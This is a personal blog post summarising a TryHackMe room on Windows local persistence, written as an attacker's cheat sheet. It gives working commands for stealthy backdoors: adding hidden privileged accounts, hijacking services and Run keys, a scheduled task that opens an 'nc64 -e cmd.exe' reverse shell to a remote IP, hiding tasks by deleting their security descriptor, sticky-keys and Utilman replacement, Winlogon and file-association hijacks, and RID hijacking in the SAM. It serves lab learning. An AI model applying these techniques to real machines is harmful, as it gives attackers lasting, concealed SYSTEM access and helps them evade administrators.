---
published: true
layout: post
tags:
  - windows
  - persistance
title: Windows Persistance List
---
# Summary
{:.no_toc}

* toc
{:toc}

# Disclaimer
This information was fully presented on TryHackMe https://tryhackme.com/room/windowslocalpersistence. If you find that usefull, go to TryHackMe and find something more.

# Intro
I was really impressed by the room from TryHackMe, I didnt know a half of this tricks, thats why I want to save this information primary for myself.

# Basics and well known tricks

## Groups and hidden rights
Well, the most obvious:
```
net localgroup administrators user /add
```

Not so obvious is `Backup Operators` group. It allows any user to read/write any file in OS, which is cool.
```
net localgroup "Backup Operators" user /add
```
Be aware, no RDP nor WinRM will be allowed for that user only from `Backup Operators` group. And also keep in mind UAC which will be in your way, so you will need to disable it.
```
C:\> reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /t REG_DWORD /v LocalAccountTokenFilterPolicy /d 1
```

And apply DACL for WinRM by this command.
```
Set-PSSessionConfiguration -Name Microsoft.PowerShell -showSecurityDescriptorUI
```

Also, we could do a little trick here and add `$` at the end of user name. Since Windows use `$` at the end by the computer accounts, it now thinks that our user is now "computer account" (actually, it doesnt, but heard me out). Computer accounts doesnt shown by `net users` command. Why? Dont ask me. And so, our user have `$` at the end, which means he is a computer account, which means he wouldn't be shown by `net users`.

## Services
We could make services with our executable as a path or change existing service executable.
Something like:
```
sc.exe config SomeService binPath= "C:\Windows\revshell.exe" start= auto obj= "LocalSystem"
```
That's important to make `obj= "LocalSystem"` so we could get a SYSTEM rights right away. And dont forget to press space after `= `! Windows like spaces.


## Startup
Another know trick is just drop a payload to folder:
```
C:\Users\<your_username>\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup
```
For starting application only for one user, or:
```
C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp
```
To start it for every user. Quite simple.

And of course we have registry paths, which is:
```
HKCU\Software\Microsoft\Windows\CurrentVersion\Run
HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce

HKLM\Software\Microsoft\Windows\CurrentVersion\Run
HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnce
```
The ones with `HKCU` will run only for the current user, the ones with `HKLM` will affect every user since it changes all local machine.
Any program specified under the `Run` keys will run every time the user logs on. Programs specified under the `RunOnce` keys will only be executed a single time.
Microsoft users type `REG_EXPAND_SZ` so maybe we should also.


## Schtasks
And schtasks, we know that, just create a task like this and execute binary every minute, no issue:
```
schtasks /create /sc minute /mo 1 /tn Backdoor /tr "c:\tools\nc64 -e cmd.exe ip 4449" /ru SYSTEM
```
And we will also get SYSTEM after that.
BUT these is a cool trick that makes your task invisible!
Task has a DACL, meaning not every user could read that task and as a result, user cannot see it. We could change DACL on our task in registry with path `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tree\`.
Note: we need to be system to edit this, so unpack your PsExec or other favorite util.
DACL stored (I think its DACL, but I may be wrong) in variable `SD` which stands for `Security Descriptor`. To be invisible we could change it, or just delete it! And since there is no DACL, no one have permission to read it! Cool stuff, but I didnt test it on editing or deleting the task, I think it also wont work but I didnt try.


## Login screen
As a backdoor we could change some executables which windows will launch if you do specific action. For example, if you press Shift 5 times, it will execute `C:\Windows\System32\sethc.exe` if we change that binary to something else, windows will execute it.
Get your right like this and copy the payload:
```
C:\> takeown /f c:\Windows\System32\sethc.exe

C:\> icacls C:\Windows\System32\sethc.exe /grant Administrator:F

C:\> copy c:\Windows\System32\cmd.exe C:\Windows\System32\sethc.exe
```
Also it can be done with `C:\Windows\System32\Utilman.exe`, which it `Ease of Access` option in Windows login screen.
Thats nice backdoors, coz binary will execute with SYSTEM right, and you could reach screen not only phisycaly, but also with RDP.


# Something cool
Not so known stuff (at least for me) is `secedit` which config and store which accounts and SID holds which privilege. So we could edit it!

First, export:
```
secedit /export /cfg config.inf
```

![1]({{ site.baseurl }}/assets/img/posts/config-inf.png){:class="imghalf"}

After editing, (just add your user at the right side of the privilege, separated by comma) we could convert and import in back.

```
secedit /import /cfg config.inf /db config.sdb
secedit /configure /db config.sdb /cfg config.inf
```
And no user at `net users`, nice.

## Winlogon
Winlogon is the process for loading user profile. It will be executed every login.
It uses 
`HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\`

`Userinit` points to `userinit.exe`, which is in charge of restoring your user profile preferences.
`shell` points to the system's shell, which is usually `explorer.exe`.

We could specify more executables in those parameters besides default one separated by comma, and everyone will be executed!
`C:\Windows\system32\userinit.exe, C:\Windows\revshell.exe`

Also, `userinit.exe` executes everything in user environment variable `UserInitMprLogonScript`. And we could change it.
Go to `HKCU\Environment` and make `UserInitMprLogonScript` variable here, drop path to the payload as a value.
Note: there is no way in will work for every user, except if you change that parameter for every user specificly.

# Something really cool
We also could do RID Hijacking. RID is actually holds by registry, and we could edit registry. 
Note: RID is just the last digits of SID, but RID actually responsible for rights.
Here is how we could see RID's:
```
wmic useraccount get name,sid
```

And here how we could edit RID in registry, note that this values could be edited only by NT AUTHORITY\SYSTEM, so wee need to use PsExec or other tools.
We need this path `HKLM\SAM\SAM\Domains\Account\Users\`
There will be a key for each user in the machine. Since we want to modify thmuser3, we need to search for a key with its RID in hex (1010 = 0x3F2). Under the corresponding key, there will be a value called F, which holds the user's effective RID at position 0x30:

![1]({{ site.baseurl }}/assets/img/posts/2-persistance.png){:class="imghalf"}

Notice the RID is stored using little-endian notation, so its bytes appear reversed.
We will now replace those two bytes with the RID of Administrator in hex (500 = 0x01F4), switching around the bytes (F401):

The next time user logs in, LSASS will associate it with the same RID as Administrator and grant them the same privileges.

Note: since lsass is responsible for this trick, I think you need to login with interacive methods, such as RDP or phisical input.

## File Associations & Extension
In Windows, file extensions accociatied with programms what will launch file as a parameter. And we could change that accociation to launch our executable, which launch our payload and after that open a real executable that supposed to be launched.
Its stored in registry `HKLM\Software\Classes\`

![1]({{ site.baseurl }}/assets/img/posts/4-persistance.png){:class="imghalf"}

There is file extension and its ProgID.
That ProgID needs to be search in `HKLM\Software\Classes\{YOUR_PROGID}\shell\open\command`

![1]({{ site.baseurl }}/assets/img/posts/5-persistance.png){:class="imghalf"}

And there you will find executable. Change it like `powershell -windowstyle hidden C:\windows\backdoor.ps1 %1` and write in ps1 script to launch first argument with notepad or something, since `%1` is a path to file, which has to be launched with that application we are hijacking.
















